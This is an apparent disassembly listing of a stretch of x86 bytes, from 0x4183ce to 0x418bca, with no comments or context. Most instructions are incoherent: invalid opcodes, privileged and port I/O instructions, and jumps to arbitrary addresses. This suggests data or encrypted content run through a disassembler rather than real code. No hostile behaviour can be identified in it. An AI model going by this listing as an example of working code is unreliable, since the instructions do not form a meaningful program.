  4183ce:	test   eax,0xf1e705b0
  4183d3:	mov    bh,0x7d
  4183d5:	sbb    DWORD PTR [ebx-0x566523b9],ebx
  4183db:	xchg   ebp,eax
  4183dc:	sub    eax,0xee73dac6
  4183e1:	adc    al,0x64
  4183e3:	out    dx,eax
  4183e4:	es (bad) 
  4183e6:	das    
  4183e7:	push   ebx
  4183e8:	(bad)  
  4183e9:	push   edx
  4183ea:	dec    ebx
  4183eb:	test   DWORD PTR [edi],ebp
  4183ed:	inc    esp
  4183ee:	out    0xd6,eax
  4183f0:	and    eax,0xfe11cda7
  4183f5:	addr16 in al,dx
  4183f7:	xchg   edx,eax
  4183f8:	int    0xa4
  4183fa:	aaa    
  4183fb:	xor    edx,ebx
  4183fd:	(bad)  
  4183fe:	mov    WORD PTR [ecx+0xc],?
  418401:	aam    0x58
  418403:	or     ah,bl
  418405:	rol    BYTE PTR [eax*8-0xabeb652],0x54
  41840d:	fwait
  41840e:	cdq    
  41840f:	retf   0x4b58
  418412:	sub    DWORD PTR ds:0xfcd206ab,eax
  418418:	ret    
  418419:	xchg   ebp,eax
  41841a:	xchg   edi,eax
  41841b:	and    bl,ah
  41841d:	fstp   QWORD PTR [ebx-0x4d]
  418420:	xchg   dl,bh
  418422:	mov    ecx,0xd5c3568b
  418427:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418428:	xchg   edx,eax
  418429:	jae    0x41842e
  41842b:	(bad)  
  41842c:	out    dx,al
  41842d:	lods   al,BYTE PTR ds:[esi]
  41842e:	fucomip st,st(4)
  418430:	pop    ds
  418431:	int    0x29
  418433:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418434:	dec    eax
  418435:	lea    edi,[ebx-0x7efeea0d]
  41843b:	repz jae 0x4183d8
  41843e:	sub    bl,BYTE PTR [edi+0x8]
  418441:	arpl   WORD PTR [edi-0x34],ax
  418444:	sub    ah,ah
  418446:	pop    esp
  418447:	arpl   WORD PTR [eax+0x7c04c2b2],dx
  41844d:	cli    
  41844e:	sahf   
  41844f:	jmp    0x418431
  418451:	stc    
  418452:	outs   dx,BYTE PTR ds:[esi]
  418453:	fsub   QWORD PTR [edi]
  418455:	cmp    bl,al
  418457:	stos   DWORD PTR es:[edi],eax
  418458:	pop    ss
  418459:	jmp    0xcfb2e566
  41845e:	cld    
  41845f:	daa    
  418460:	xchg   ecx,eax
  418461:	sbb    eax,0xbfb0d6df
  418466:	push   ecx
  418467:	(bad)  
  418468:	jp     0x418472
  41846a:	test   eax,0xb6c2ff4b
  41846f:	dec    esi
  418470:	mov    ss,WORD PTR [esi]
  418472:	test   BYTE PTR [ebx+0x38],0x1c
  418476:	cmp    DWORD PTR [ebx+0x4ea8fa27],ebx
  41847c:	add    eax,0xb78daa2
  418481:	bound  ebp,QWORD PTR [esi]
  418483:	clc    
  418484:	bound  edx,QWORD PTR [ebx+0x46c1b535]
  41848a:	xor    DWORD PTR [ebp-0x3b],eax
  41848d:	addr16 jno 0x418413
  418490:	or     eax,0x914dc012
  418495:	and    BYTE PTR [ecx+0x1008d49b],ah
  41849b:	mov    cl,0xf2
  41849d:	retf   
  41849e:	push   ds
  41849f:	jno    0x418485
  4184a1:	int    0x91
  4184a3:	inc    esp
  4184a4:	or     DWORD PTR [edi-0x63c61b3a],edi
  4184aa:	aas    
  4184ab:	mov    ds:0xf338a1,eax
  4184b0:	dec    edi
  4184b1:	je     0x41848a
  4184b3:	shr    DWORD PTR [esi],1
  4184b5:	test   DWORD PTR [edx-0x31436a20],edx
  4184bb:	ins    DWORD PTR es:[edi],dx
  4184bc:	mov    ecx,0x912ab19e
  4184c1:	fistp  DWORD PTR [esi+0x16]
  4184c4:	jb     0x4184ec
  4184c6:	popf   
  4184c7:	fucomip st,st(1)
  4184c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184ca:	ss aad 0x60
  4184cd:	cdq    
  4184ce:	and    eax,0x738ec880
  4184d3:	popf   
  4184d4:	cmp    esi,DWORD PTR [esi-0xc4baecc]
  4184da:	jno    0x41851e
  4184dc:	jns    0x4184ab
  4184de:	(bad)  
  4184df:	in     al,0xa0
  4184e1:	xor    ebx,DWORD PTR [eax+0x2d21fe7f]
  4184e7:	push   0x9cfc507d
  4184ec:	mov    ds:0xb1466fa1,al
  4184f1:	jl     0x418517
  4184f3:	popa   
  4184f4:	xor    eax,0x992a14e2
  4184f9:	(bad)  [ebx]
  4184fb:	stc    
  4184fc:	es fcmovbe st,st(7)
  4184ff:	ret    
  418500:	int    0x25
  418502:	daa    
  418503:	pop    edi
  418504:	retf   0x3fd5
  418507:	and    eax,0x763ad919
  41850c:	vfnmsubpd ymm3,ymm3,YMMWORD PTR [ebx],ymm2
  418512:	lds    edi,FWORD PTR [ebx+0x1c]
  418515:	fisttp DWORD PTR [edx]
  418517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418518:	cdq    
  418519:	aaa    
  41851a:	hlt    
  41851b:	sub    eax,0x4901c68f
  418520:	or     eax,0xde63bfff
  418525:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418526:	push   edx
  418527:	dec    esi
  418528:	xchg   edx,eax
  418529:	xor    BYTE PTR [ebp-0x37],bh
  41852c:	cmp    al,0x56
  41852e:	sbb    al,0xfa
  418530:	push   ebx
  418531:	inc    esi
  418532:	int    0xd8
  418534:	mov    esi,0x5baa1a03
  418539:	imul   esp,DWORD PTR [edi+0x63f8d964],0xd20bb010
  418543:	pop    esi
  418544:	lock repnz mov ah,0xa9
  418548:	push   0x2375dd58
  41854d:	sbb    esp,esi
  41854f:	adc    ah,BYTE PTR [ecx]
  418551:	mov    dl,0x2b
  418553:	cmp    eax,0xfd3d8cbe
  418558:	or     eax,0x6a0800b9
  41855d:	xchg   ecx,eax
  41855e:	mov    ecx,0xf52f1053
  418563:	pop    es
  418564:	fdiv   QWORD PTR [edi-0x3e05c3f1]
  41856a:	sub    DWORD PTR [ebx+0x59],ebx
  41856d:	sbb    bl,BYTE PTR [esp+ebx*8]
  418570:	push   cs
  418571:	or     ah,BYTE PTR [eax-0x16b75b4d]
  418577:	adc    al,0x57
  418579:	enter  0xca09,0x71
  41857d:	push   ecx
  41857e:	leave  
  41857f:	adc    DWORD PTR [eax+ebp*2-0x19c9840e],0x64edb718
  41858a:	xor    eax,0xae3c1bc5
  41858f:	jmp    0x41852c
  418591:	ds das 
  418593:	mov    bl,0x47
  418595:	clc    
  418596:	mov    bl,0xec
  418598:	stos   BYTE PTR es:[edi],al
  418599:	int    0x32
  41859b:	rol    ecx,cl
  41859d:	repnz pop eax
  41859f:	ret    
  4185a0:	pandn  mm6,QWORD PTR [edx]
  4185a3:	mov    al,ds:0x75c77311
  4185a8:	out    dx,eax
  4185a9:	js     0x4185b2
  4185ab:	push   edi
  4185ac:	push   edx
  4185ad:	(bad)  
  4185b0:	xchg   esp,eax
  4185b1:	mov    edi,ds
  4185b3:	retf   
  4185b4:	retf   
  4185b5:	retf   
  4185b6:	jmp    0xcce05732
  4185bb:	mov    edi,0x96b585c7
  4185c0:	dec    ecx
  4185c1:	push   0x60
  4185c3:	jno    0x418546
  4185c5:	scas   al,BYTE PTR es:[edi]
  4185c6:	(bad)  
  4185c7:	aam    0x5c
  4185c9:	repnz ds mov ecx,0xde19cf2f
  4185d0:	std    
  4185d1:	js     0x4185cc
  4185d3:	lods   eax,DWORD PTR ds:[esi]
  4185d4:	test   DWORD PTR [ebp+0x75],eax
  4185d7:	xlat   BYTE PTR ds:[ebx]
  4185d8:	pop    ecx
  4185d9:	int3   
  4185da:	icebp  
  4185db:	add    al,dl
  4185dd:	arpl   WORD PTR cs:[ebx-0x40],bx
  4185e1:	dec    edi
  4185e2:	out    0xf6,eax
  4185e4:	mov    bl,0xb3
  4185e6:	mov    ch,0x4e
  4185e8:	pop    edi
  4185e9:	sbb    DWORD PTR [ebx],0x15
  4185ec:	cmp    edi,ecx
  4185ee:	imul   edx,DWORD PTR [esi],0x309ca94d
  4185f4:	in     eax,0x86
  4185f6:	adc    eax,0x95e6b8b4
  4185fb:	sub    DWORD PTR [eax],edx
  4185fd:	pop    esp
  4185fe:	fcomip st,st(6)
  418600:	mov    ch,BYTE PTR [ebp+0x19b64d1e]
  418606:	lods   eax,DWORD PTR ds:[esi]
  418607:	push   ecx
  418608:	in     eax,0xa4
  41860a:	rcr    BYTE PTR [esi+eax*8+0x18378c0],0x54
  418612:	inc    ebx
  418613:	lods   eax,DWORD PTR ds:[esi]
  418614:	test   BYTE PTR [ebx-0x21],al
  418617:	test   DWORD PTR ds:[esi+0x116e0ff0],ebp
  41861e:	mov    DWORD PTR [edi+0x0],0x67ec6416
  418625:	jp     0x418653
  418627:	push   ebp
  418628:	jle    0x41868f
  41862a:	fisttp WORD PTR [ecx+0x35]
  41862d:	sub    BYTE PTR ss:[ecx+0x629efe99],bh
  418634:	xor    dh,BYTE PTR [edi]
  418636:	retf   
  418637:	mov    bl,0x9c
  418639:	repz out 0x67,al
  41863c:	in     eax,0x4a
  41863e:	xor    dh,BYTE PTR [ebx+0x7bbda84b]
  418644:	ror    DWORD PTR [esi+edi*1+0x5],0x3d
  418649:	pop    edx
  41864a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41864b:	mov    cl,dl
  41864d:	retf   
  41864e:	push   ecx
  41864f:	or     BYTE PTR [edx+0x1b],0x54
  418653:	das    
  418654:	lods   al,BYTE PTR ds:[esi]
  418655:	sub    eax,0x41c8cfa6
  41865a:	je     0x41865e
  41865c:	dec    eax
  41865d:	adc    BYTE PTR [esi-0x1d],0x49
  418661:	daa    
  418662:	inc    ebp
  418663:	mov    esp,0x24e7a5f6
  418668:	adc    DWORD PTR [eax+eiz*1-0x1e4a5870],0x5c
  418670:	dec    eax
  418671:	mov    ebp,0x72f1811d
  418676:	mov    al,ds:0x761e8efd
  41867b:	pop    ecx
  41867c:	into   
  41867d:	jns    0x418654
  41867f:	cmp    eax,0xfc49c760
  418684:	cmp    DWORD PTR ss:[ecx],eax
  418687:	in     al,0xa6
  418689:	add    al,BYTE PTR [ebx*4-0x6610bb81]
  418690:	sbb    bh,bl
  418692:	ret    0x4739
  418695:	inc    edx
  418696:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418697:	popf   
  418698:	test   eax,0x7620dd06
  41869d:	jg     0x418628
  41869f:	ret    
  4186a0:	out    0x6c,eax
  4186a2:	aaa    
  4186a3:	cmp    BYTE PTR [eax-0x531cffe4],ch
  4186a9:	scas   al,BYTE PTR es:[edi]
  4186aa:	cmp    al,0xf9
  4186ac:	or     eax,0xc891a1db
  4186b1:	xchg   esi,eax
  4186b2:	outs   dx,DWORD PTR ds:[esi]
  4186b3:	jle    0x4186d9
  4186b5:	arpl   WORD PTR [esi],dx
  4186b7:	leave  
  4186b8:	mov    al,0x13
  4186ba:	xchg   DWORD PTR [ecx+0x57],ebp
  4186bd:	mov    bh,0x1a
  4186bf:	dec    esp
  4186c0:	mov    gs,WORD PTR [edx+0x4d7ba82d]
  4186c6:	adc    bl,bh
  4186c8:	(bad)  
  4186c9:	mov    WORD PTR [ecx+0x25],?
  4186cc:	test   DWORD PTR [ebx+0x45cd7e99],esi
  4186d2:	retf   0xd8eb
  4186d5:	jecxz  0x41867e
  4186d7:	mov    ss,WORD PTR [esi]
  4186d9:	vandps xmm7,xmm4,XMMWORD PTR [ecx]
  4186dd:	inc    eax
  4186de:	cmp    eax,0xe0225d73
  4186e3:	push   ecx
  4186e4:	xchg   esp,eax
  4186e5:	xchg   BYTE PTR [esi-0x4a4e6ddb],al
  4186eb:	xor    dl,BYTE PTR [eax]
  4186ed:	jae    0x418751
  4186ef:	or     BYTE PTR ds:0xbae68e47,dh
  4186f5:	ficomp WORD PTR [ebp+0xbe95d0]
  4186fb:	cs pop es
  4186fd:	cmp    BYTE PTR [esi-0x76],bh
  418700:	rcl    BYTE PTR [esi-0x38],1
  418703:	out    dx,eax
  418704:	and    dl,BYTE PTR ds:0xc47a5ed2
  41870a:	mov    dh,0x58
  41870c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41870d:	fadd   QWORD PTR [edx+edi*1+0x7ab78127]
  418714:	pop    es
  418715:	es pop esp
  418717:	test   eax,0xd043a6b0
  41871c:	fisttp DWORD PTR [ebx-0x74cfda0e]
  418722:	xlat   BYTE PTR ds:[ebx]
  418723:	sti    
  418724:	and    eax,DWORD PTR [edi-0x5beaee43]
  41872a:	mov    ah,0x50
  41872c:	sbb    BYTE PTR [ecx-0x65],0x7e
  418730:	add    ch,ah
  418732:	xor    al,0xb3
  418734:	loope  0x4187b4
  418736:	add    esi,DWORD PTR [ebp+0xe22afa6]
  41873c:	fs fwait
  41873e:	push   ds
  41873f:	(bad)  
  418740:	pop    ds
  418741:	push   esi
  418742:	jnp    0x418781
  418744:	xchg   ebp,eax
  418745:	mov    al,ds:0xf68cd4fb
  41874a:	outs   dx,BYTE PTR ds:[esi]
  41874b:	lds    edx,FWORD PTR [esi]
  41874d:	dec    edx
  41874e:	pop    ebx
  41874f:	in     eax,dx
  418750:	dec    ecx
  418751:	int    0x98
  418753:	push   cs
  418754:	cmp    dh,BYTE PTR [ecx]
  418756:	pop    edx
  418757:	mov    eax,0xb92961d1
  41875c:	std    
  41875d:	aam    0x5f
  41875f:	in     al,0x94
  418761:	adc    eax,DWORD PTR [ebx]
  418763:	shl    edi,1
  418765:	fucomip st,st(1)
  418767:	or     eax,0xc2000005
  41876c:	ds (bad) 
  41876e:	retf   0xcac4
  418771:	ret    0x85c6
  418774:	aad    0x2e
  418776:	leave  
  418777:	mov    edx,0x25ce20a5
  41877c:	loopne 0x4187fd
  41877e:	js     0x4187f3
  418780:	jl     0x4187fa
  418782:	js     0x4187d0
  418784:	jmp    0x418739
  418786:	je     0x4187aa
  418788:	mov    eax,ds:0xe1679bf2
  41878d:	push   edi
  41878e:	fcom   QWORD PTR [edx-0x28]
  418791:	fcomp  DWORD PTR [esp+eiz*4-0x70]
  418795:	(bad)  [eax+0x30]
  418798:	div    dl
  41879a:	push   cs
  41879b:	test   DWORD PTR [eax+0x35de3407],edx
  4187a1:	fsubr  QWORD PTR ds:0x9dee5fe3
  4187a7:	imul   ebx,DWORD PTR [eax],0xac5425d
  4187ad:	and    DWORD PTR [eax+0x60],0x22573ecd
  4187b4:	jbe    0x41873c
  4187b6:	ds into 
  4187b8:	jbe    0x418777
  4187ba:	jb     0x4187d9
  4187bc:	add    ah,al
  4187be:	pop    eax
  4187bf:	jecxz  0x418762
  4187c1:	dec    edx
  4187c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187c3:	sub    eax,0xc04c6f12
  4187c8:	jecxz  0x41883e
  4187ca:	stos   BYTE PTR es:[edi],al
  4187cb:	xor    al,BYTE PTR ds:0x4bb5a94c
  4187d1:	scas   al,BYTE PTR es:[edi]
  4187d2:	hlt    
  4187d3:	daa    
  4187d4:	xchg   ecx,eax
  4187d5:	and    eax,0xef19869e
  4187da:	or     ch,dl
  4187dc:	pop    ebx
  4187dd:	jl     0x418812
  4187df:	lea    esp,[eax]
  4187e1:	les    edi,FWORD PTR [ebx+0x6c]
  4187e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187e5:	sbb    DWORD PTR [esi],eax
  4187e7:	jne    0x418794
  4187e9:	jecxz  0x41877a
  4187eb:	cmp    eax,0xfd7a363d
  4187f0:	lods   al,BYTE PTR ds:[esi]
  4187f1:	out    0x6c,al
  4187f3:	and    eax,0x32a74101
  4187f8:	and    esp,DWORD PTR [esi-0x51]
  4187fb:	xor    al,0xbe
  4187fd:	inc    ebx
  4187fe:	(bad)  
  4187ff:	push   esi
  418800:	sub    al,0xb3
  418802:	icebp  
  418803:	adc    ah,BYTE PTR [esi-0x3a]
  418806:	loopne 0x41878d
  418808:	cmp    eax,0xe08636d0
  41880d:	lea    esp,[edx-0x4f]
  418810:	int3   
  418811:	cmp    al,0x2c
  418813:	gs and al,0x7b
  418816:	dec    edx
  418817:	sbb    BYTE PTR [eax],bl
  418819:	repz test DWORD PTR [ebx+0x57c15852],0xcf1cf867
  418824:	imul   eax,DWORD PTR [edi+0x46b240c],0xc00fe3aa
  41882e:	mov    esp,0xb2685040
  418833:	(bad)  
  418834:	imul   ebp,DWORD PTR [eax+0x5f],0x9b75f69b
  41883b:	in     eax,dx
  41883c:	mov    DWORD PTR [esi+0x4e],0x8cf4bf49
  418843:	test   eax,0xe531439b
  418848:	sahf   
  418849:	mov    al,0x95
  41884b:	es aaa 
  41884d:	add    cl,0xbe
  418850:	and    dh,ah
  418852:	jmp    0x418865
  418854:	pushf  
  418855:	push   ecx
  418856:	push   edi
  418857:	pop    DWORD PTR [edx]
  418859:	or     DWORD PTR [edx+0x1ce2853b],eax
  41885f:	pop    es
  418860:	mov    bl,0x27
  418862:	mov    eax,ds:0xc2db3fec
  418867:	jno    0x418822
  418869:	dec    eax
  41886a:	xchg   edi,eax
  41886b:	jl     0x41888a
  41886d:	pop    esi
  41886e:	mov    DWORD PTR [ebp+0x6eea4608],edx
  418874:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418875:	sbb    eax,0xc02aa451
  41887a:	mov    edi,0xa6d0fce9
  41887f:	js     0x4188e2
  418881:	enter  0x6fc5,0xd5
  418885:	pop    esp
  418886:	es lahf 
  418888:	js     0x418836
  41888a:	cdq    
  41888b:	aam    0xaa
  41888d:	jle    0x4188e3
  41888f:	mov    eax,ds:0xaecee852
  418894:	loopne 0x418829
  418896:	pusha  
  418897:	rdmsr  
  418899:	sub    BYTE PTR [edi+ebx*2-0x4cc26270],dl
  4188a0:	ds icebp 
  4188a2:	aaa    
  4188a3:	pop    ss
  4188a4:	stc    
  4188a5:	xchg   BYTE PTR ds:0x4db9f30b,ch
  4188ab:	js     0x4188ab
  4188ad:	adc    eax,0x3715a5f8
  4188b2:	call   0x9899:0x4252bb25
  4188b9:	lods   eax,DWORD PTR ds:[esi]
  4188ba:	dec    ebx
  4188bb:	sub    ebp,ebx
  4188bd:	fs icebp 
  4188bf:	jnp    0x418848
  4188c1:	xchg   DWORD PTR [eax+0x27c1902d],edi
  4188c7:	fsubr  QWORD PTR [edi-0x14]
  4188ca:	jmp    0x6ee96b8c
  4188cf:	cmp    ch,BYTE PTR [eax-0x67eed996]
  4188d5:	cmp    ebx,DWORD PTR [esi]
  4188d7:	(bad)  
  4188d8:	xor    eax,0x2c172a8b
  4188dd:	dec    esi
  4188de:	dec    esi
  4188df:	loop   0x41895b
  4188e1:	fucomip st,st(4)
  4188e3:	sub    eax,0xb30e344b
  4188e8:	cmp    al,0x94
  4188eb:	or     al,ah
  4188ed:	lock inc esp
  4188ef:	cmc    
  4188f0:	push   ds
  4188f1:	test   DWORD PTR [ebx],eax
  4188f3:	fadd   DWORD PTR [ebx+eax*1+0x76]
  4188f7:	mov    al,0x60
  4188f9:	jo     0x4188f2
  4188fb:	fstp   st(1)
  4188fd:	cli    
  4188fe:	jno    0x4188d9
  418900:	les    ebx,FWORD PTR [ecx+0x10]
  418903:	jns    0x418963
  418905:	xchg   ebx,eax
  418906:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418907:	cwde   
  418908:	shl    BYTE PTR [ebx-0x7dfec78a],cl
  41890e:	push   es
  41890f:	xchg   esi,eax
  418910:	xchg   BYTE PTR [eax+0x3],cl
  418913:	jo     0x4188f4
  418915:	ins    DWORD PTR es:[edi],dx
  418916:	inc    edx
  418917:	std    
  418918:	sub    BYTE PTR [ebp+0x1bedc9bf],0xb4
  41891f:	inc    ebx
  418920:	cmc    
  418921:	call   0x2f79bb01
  418926:	jmp    0x6efe:0xbed68f
  41892d:	sbb    al,0x6d
  41892f:	push   es
  418930:	dec    esi
  418931:	ret    
  418932:	jbe    0x4188bc
  418934:	cmp    eax,0xf90ca5b3
  418939:	lds    esp,FWORD PTR [esi-0x76]
  41893c:	jg     0x41894a
  41893e:	pop    ss
  41893f:	iret   
  418940:	xchg   dl,al
  418942:	mov    dl,0x21
  418944:	sbb    al,0xfa
  418946:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418947:	mov    eax,DWORD PTR [eax]
  418949:	adc    eax,DWORD PTR [ebp+0x78b76150]
  41894f:	lds    ebx,FWORD PTR [ecx]
  418951:	fidivr WORD PTR [ecx-0x318b281b]
  418957:	jge    0x4189a0
  418959:	xchg   DWORD PTR [ecx+0x567040c2],ecx
  41895f:	push   eax
  418960:	add    dl,BYTE PTR [esi+0x40]
  418963:	fnstcw WORD PTR [edx-0x19]
  418966:	push   0xbfe97e59
  41896b:	adc    dh,BYTE PTR [edx+edi*8-0x573e0c04]
  418972:	ret    0xaf9f
  418975:	ror    ebx,0xc2
  418978:	dec    ebp
  418979:	mov    BYTE PTR [ecx-0x6715c809],bl
  41897f:	sbb    DWORD PTR [ecx+ebp*1+0xe],0x53a378d2
  418987:	out    dx,eax
  418988:	adc    ebp,ebx
  41898a:	call   0xa919:0xc77c701d
  418991:	mov    BYTE PTR [esi],al
  418993:	and    bh,al
  418995:	in     eax,dx
  418996:	std    
  418997:	loope  0x4189e1
  418999:	push   ecx
  41899a:	scas   al,BYTE PTR es:[edi]
  41899b:	cs in  al,0x5f
  41899e:	jecxz  0x41899a
  4189a0:	and    eax,0x5693d309
  4189a5:	mov    bl,cl
  4189a7:	cli    
  4189a8:	jge    0x418a1b
  4189aa:	fnsave [ecx-0x64]
  4189ad:	cdq    
  4189ae:	repz in eax,0x2c
  4189b1:	sub    al,bl
  4189b3:	pop    esi
  4189b4:	xchg   esi,eax
  4189b5:	inc    eax
  4189b6:	aam    0xc2
  4189b8:	scas   al,BYTE PTR es:[edi]
  4189b9:	push   ecx
  4189bb:	xor    esp,DWORD PTR [ecx+0x1349fcbb]
  4189c1:	add    eax,0x5295401e
  4189c6:	cmovle ebp,DWORD PTR [eax-0x29]
  4189ca:	stc    
  4189cb:	call   0x9769:0xce64ccbd
  4189d2:	mov    ah,0xd4
  4189d4:	data16 lods al,BYTE PTR ds:[esi]
  4189d6:	xchg   ebp,eax
  4189d7:	inc    ecx
  4189d8:	ficomp WORD PTR [edx]
  4189da:	(bad)  
  4189db:	pusha  
  4189dc:	adc    DWORD PTR [edi-0x4445511],0x56
  4189e3:	fs mov bl,0x78
  4189e6:	cmc    
  4189e7:	mov    ecx,0xe258ca27
  4189ec:	sti    
  4189ed:	adc    cl,al
  4189ef:	xor    eax,0x916c8fea
  4189f4:	test   BYTE PTR ds:0xd29036,dh
  4189fa:	hlt    
  4189fb:	(bad)  
  4189fc:	jne    0x418a19
  4189fe:	je     0x418a05
  418a00:	das    
  418a01:	xchg   ebx,eax
  418a02:	rol    DWORD PTR [eax+0x1a],0xff
  418a06:	repnz inc DWORD PTR [ebp-0x147c5d38]
  418a0d:	cmc    
  418a0e:	repz fldcw WORD PTR [ecx]
  418a11:	add    al,0x6b
  418a13:	call   DWORD PTR [ebp+0x67d91e45]
  418a19:	sub    esi,eax
  418a1b:	in     eax,dx
  418a1c:	sar    DWORD PTR [edi+esi*8+0x1a],0x88
  418a21:	push   ecx
  418a22:	mov    ebp,0x5d0a839b
  418a27:	mov    esp,0xc61deb1
  418a2c:	jp     0x418a10
  418a2e:	add    al,0xfa
  418a30:	mov    WORD PTR [ebp+0x7],cs
  418a33:	sub    eax,0xfb19f7d5
  418a38:	stos   DWORD PTR es:[edi],eax
  418a39:	inc    esi
  418a3a:	or     al,0x72
  418a3c:	mov    eax,ds:0xcc0076ac
  418a41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a42:	xchg   esi,eax
  418a43:	scas   al,BYTE PTR es:[edi]
  418a44:	ret    
  418a45:	shr    BYTE PTR [ecx-0x68f7eced],0xb3
  418a4c:	into   
  418a4d:	out    dx,al
  418a4e:	adc    eax,0xcd0437ba
  418a53:	or     ebp,esi
  418a55:	adc    al,0xae
  418a57:	add    dl,BYTE PTR [ecx-0x35]
  418a5a:	cld    
  418a5b:	stos   DWORD PTR es:[edi],eax
  418a5c:	add    BYTE PTR [ecx-0x570b6b42],0xe6
  418a63:	out    0x2c,al
  418a65:	mov    esp,0xedc62307
  418a6a:	dec    eax
  418a6b:	fcmovnbe st,st(4)
  418a6d:	inc    edx
  418a6e:	(bad)  
  418a6f:	cmc    
  418a70:	jmp    0x418a66
  418a72:	lea    esp,[esi+0x67]
  418a75:	sbb    eax,0xa5083395
  418a7a:	fcom   st(5)
  418a7c:	mov    edi,0x30c6075e
  418a81:	push   ebx
  418a82:	ja     0x418ae7
  418a84:	shl    esp,cl
  418a86:	xchg   DWORD PTR [edi],esi
  418a88:	lahf   
  418a89:	mov    ecx,edi
  418a8b:	test   eax,0x2e614746
  418a90:	adc    ebx,DWORD PTR [eax-0x259e2c1d]
  418a96:	test   DWORD PTR [ecx+0x71],ebx
  418a99:	mov    WORD PTR [ebx+0x359ee179],gs
  418a9f:	and    bl,BYTE PTR [edi]
  418aa1:	lea    ecx,[esi+0x1427f47]
  418aa7:	sub    DWORD PTR [ecx+esi*1-0x23b6d2e0],edx
  418aae:	fistp  WORD PTR [edi]
  418ab0:	push   esi
  418ab1:	mov    dh,0xd3
  418ab3:	pop    ecx
  418ab4:	push   ds
  418ab5:	adc    BYTE PTR [ebx],dh
  418ab7:	jg     0x418a9d
  418ab9:	dec    esp
  418aba:	jg     0x418a67
  418abc:	push   0xb58f6338
  418ac1:	sbb    ch,bh
  418ac3:	cs mov bl,0x82
  418ac6:	loop   0x418af0
  418ac8:	out    dx,al
  418ac9:	pop    es
  418aca:	dec    eax
  418acb:	push   ebx
  418acc:	test   bl,cl
  418ace:	stos   BYTE PTR es:[edi],al
  418acf:	push   esp
  418ad0:	fwait
  418ad1:	icebp  
  418ad2:	cmp    al,0xd1
  418ad4:	(bad)  
  418ad5:	icebp  
  418ad6:	cli    
  418ad7:	sbb    ebp,esi
  418ad9:	stos   DWORD PTR es:[edi],eax
  418ada:	pop    es
  418adb:	xchg   edx,eax
  418adc:	les    esp,FWORD PTR [edx+0x40884fea]
  418ae2:	cmp    DWORD PTR gs:[edx],ebp
  418ae5:	outs   dx,BYTE PTR ds:[esi]
  418ae6:	push   ebp
  418ae7:	aaa    
  418ae8:	or     dl,BYTE PTR ds:0x963216cb
  418aee:	rol    edx,1
  418af0:	clc    
  418af1:	idiv   BYTE PTR [ebp+0x5a]
  418af4:	push   ebx
  418af5:	or     eax,0xd1504ab8
  418afa:	and    ecx,eax
  418afc:	mov    DWORD PTR [ecx+0x2237940a],eax
  418b02:	sbb    cl,ch
  418b04:	aam    0x39
  418b06:	dec    edi
  418b07:	adc    al,0xa4
  418b09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b0a:	or     DWORD PTR [edi+ebp*2+0x684d9211],ebx
  418b11:	rcl    esi,cl
  418b13:	(bad)  
  418b14:	sti    
  418b15:	hlt    
  418b16:	dec    edx
  418b17:	and    edi,edi
  418b19:	dec    ebp
  418b1a:	pusha  
  418b1b:	dec    ecx
  418b1c:	jne    0x418ab7
  418b1e:	ja     0x418acc
  418b20:	stos   BYTE PTR es:[edi],al
  418b21:	adc    BYTE PTR [edx+ebx*2],ch
  418b24:	in     eax,dx
  418b25:	addr16 push ecx
  418b27:	enter  0x9d0f,0x82
  418b2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b2c:	jmp    0xe799e969
  418b31:	fcomi  st,st(3)
  418b33:	inc    ebx
  418b34:	addr16 pushf 
  418b36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b37:	push   ecx
  418b38:	nop
  418b39:	retf   0x87b3
  418b3c:	and    eax,0xa9bcd707
  418b41:	and    ebp,DWORD PTR [ecx-0x46d53fb4]
  418b47:	inc    ebp
  418b48:	inc    eax
  418b49:	stos   DWORD PTR es:[edi],eax
  418b4a:	into   
  418b4b:	enter  0x25dd,0xbf
  418b4f:	mov    edi,0x7b92632f
  418b54:	xor    al,bh
  418b56:	mov    edx,0x2f3914f7
  418b5b:	or     edi,esp
  418b5d:	dec    esp
  418b5e:	in     eax,dx
  418b5f:	xchg   DWORD PTR [ebp+ebp*1+0x6e12c33b],edi
  418b66:	pop    ds
  418b67:	dec    ebp
  418b68:	cmp    eax,0x31946ad4
  418b6d:	pop    ecx
  418b6e:	jmp    0x4ef4:0x15e98ecd
  418b75:	or     BYTE PTR [ecx-0x1e],ah
  418b78:	dec    ecx
  418b79:	mov    ds:0x3ce293cc,al
  418b7e:	mov    DWORD PTR [edx],ebp
  418b80:	push   ds
  418b81:	add    edi,DWORD PTR [ecx+ebp*2+0x18]
  418b85:	pop    esi
  418b86:	shl    cl,cl
  418b88:	test   DWORD PTR [esi-0x51],ebp
  418b8b:	adc    eax,0x600941c4
  418b90:	pop    esp
  418b91:	aad    0x2c
  418b93:	sub    BYTE PTR ds:0xaf49691b,dl
  418b99:	jae    0x418b82
  418b9b:	dec    ebx
  418b9c:	adc    edi,DWORD PTR [edi+0x17]
  418b9f:	repz jo 0x418bf2
  418ba2:	cmp    esp,DWORD PTR [esp+ebx*8-0x6e]
  418ba6:	shl    DWORD PTR [esi+0x3e],cl
  418ba9:	retf   0xbd33
  418bac:	push   cs
  418bad:	dec    esi
  418bae:	and    eax,0x1e036f6b
  418bb3:	(bad)  
  418bb4:	jno    0x418b7e
  418bb6:	pop    ds
  418bb7:	dec    esp
  418bb8:	mul    BYTE PTR [edx+0x6e4adc99]
  418bbe:	sub    al,0x4d
  418bc0:	push   0x72
  418bc2:	and    ch,BYTE PTR [esi+0x66]
  418bc5:	(bad)  
  418bc6:	xor    WORD PTR [edx+0x7e],dx
  418bca:	nop
